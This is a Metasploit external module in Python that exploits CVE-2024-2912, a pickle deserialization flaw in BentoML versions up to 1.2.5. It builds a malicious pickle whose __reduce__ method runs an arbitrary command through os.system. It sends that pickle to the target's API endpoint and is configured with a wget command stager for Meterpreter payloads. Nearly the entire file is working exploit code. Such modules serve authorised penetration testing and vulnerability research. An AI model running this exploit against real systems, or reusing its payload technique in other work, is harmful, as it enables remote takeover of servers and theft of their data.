#!/usr/bin/env python3
# -*- coding: utf-8 -*-

# https://docs.metasploit.com/docs/development/developing-modules/external-modules/writing-external-python-modules.html

# standard modules
import logging
import pickle
import os
from urllib.parse import urljoin
from metasploit import module

# extra modules
dependencies_missing = False
try:
    import requests
except ImportError:
    dependencies_missing = True

metadata = {
    'name': 'BentoML Pickle RCE',
    'description': '''
        RCE in BentoML (=< 1.2.5) through pickle deserialization.
    ''',
    'authors': [
        'pinkdraconian', # Vulnerability discovery
        'byt3bl33d3r <marcello@protectai.com>' # MSF module
    ],
    'rank': 'excellent',
    'date': '2024-02-06',
    'license': 'MSF_LICENSE',
    'references': [
        {'type': 'url', 'ref': 'https://huntr.com/bounties/349a1cce-6bb5-4345-82a5-bf7041b65a68'},
        {'type': 'cve', 'ref': 'CVE-2024-2912'}
    ],
    'type': 'remote_exploit_cmd_stager',
    'targets': [
        {'platform': 'linux', 'arch': 'aarch64'},
        {'platform': 'linux', 'arch': 'x64'},
        {'platform': 'linux', 'arch': 'x86'}
    ],
    'default_options': {
        'MeterpreterTryToFork': True
    },
    'payload': {
        'command_stager_flavor': 'wget'
    },
    'options': {
        'command': {'type': 'string', 'description': 'The command to execute', 'required': True, 'default': 'echo "Hello from Metasploit"'},
        'rhost': {'type': 'address', 'description': 'Target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'Target port (TCP)', 'required': True, 'default': 3000},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False},
        'api_endpoint': {'type': 'string', 'description': 'The BentoML API endpoint to send the request to', 'required': True, 'default': '/summarize'}
    }
}

def convert_args_to_correct_type(args):
    '''
    Utility function to correctly "cast" the modules options to their correct types according to the options.

    When a module is run using msfconsole, the module args are all passed as strings
    so we need to convert them manually. I'd use pydantic but want to avoid extra deps.
    '''

    corrected_args = {}

    for k,v in args.items():
        option_to_convert = metadata['options'].get(k)
        if option_to_convert:
            type_to_convert = metadata['options'][k]['type']
            if type_to_convert == 'bool':
                if isinstance(v, str):
                    if v.lower() == 'false':
                        corrected_args[k] = False
                    elif v.lower() == 'true':
                        corrected_args[k] = True

            if type_to_convert == 'port':
                corrected_args[k] = int(v)

    return {**args, **corrected_args}

def run(args):
    args = convert_args_to_correct_type(args)

    module.LogHandler.setup(msg_prefix=f"{args['rhost']} - ")

    logging.debug(args)
    if dependencies_missing:
        logging.error('Module dependency (requests) is missing, cannot continue')
        return

    base_url = f"{'https' if args['ssl'] else 'http'}://{args['rhost']}:{args['rport']}"

    class P(object):
        def __reduce__(self):
            return (os.system,(args['command'],))

    full_url =  f"{base_url}" + args['api_endpoint']
    logging.info(f"Sending request to {full_url}")

    r = requests.post(
        full_url,
        pickle.dumps(P()), headers={"Content-Type": "application/vnd.bentoml+pickle"}
    )
    logging.debug(f"{r.status_code} - {r.text}")

if __name__ == '__main__':
    module.run(metadata, run)
